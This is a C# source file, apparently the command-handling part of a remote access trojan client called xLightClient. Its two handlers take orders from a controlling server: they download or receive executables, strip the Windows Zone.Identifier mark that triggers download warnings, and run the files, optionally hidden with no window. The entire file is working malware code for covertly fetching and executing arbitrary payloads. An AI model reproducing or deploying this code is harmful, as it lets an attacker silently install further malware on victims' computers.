using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using xLightClient.Core.Helper;
using xLightClient.Core.Networking;
using xLightClient.Core.Utilities;

namespace xLightClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleDoDownloadAndExecute(Packets.ServerPackets.DoDownloadAndExecute command,
            Client client)
        {
            new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Downloaded File!").Execute(client);

                try
                {
                    FileHelper.DeleteZoneIdentifier(tempFile);

                    var bytes = File.ReadAllBytes(tempFile);
                    if (!FileHelper.IsValidExecuteableFile(bytes))
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    NativeMethods.DeleteFile(tempFile);
                    new Packets.ClientPackets.SetStatus("Execution failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleDoUploadAndExecute(Packets.ServerPackets.DoUploadAndExecute command, Client client)
        {
            if (!_renamedFiles.ContainsKey(command.ID))
                _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));

            string filePath = _renamedFiles[command.ID];

            try
            {
                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                    throw new Exception("No executable file");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    throw new Exception(destFile.LastError);

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    if (_renamedFiles.ContainsKey(command.ID))
                        _renamedFiles.Remove(command.ID);

                    FileHelper.DeleteZoneIdentifier(filePath);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Packets.ClientPackets.SetStatus("Executed File!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                if (_renamedFiles.ContainsKey(command.ID))
                    _renamedFiles.Remove(command.ID);
                NativeMethods.DeleteFile(filePath);
                new Packets.ClientPackets.SetStatus(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
            }
        }

    }
}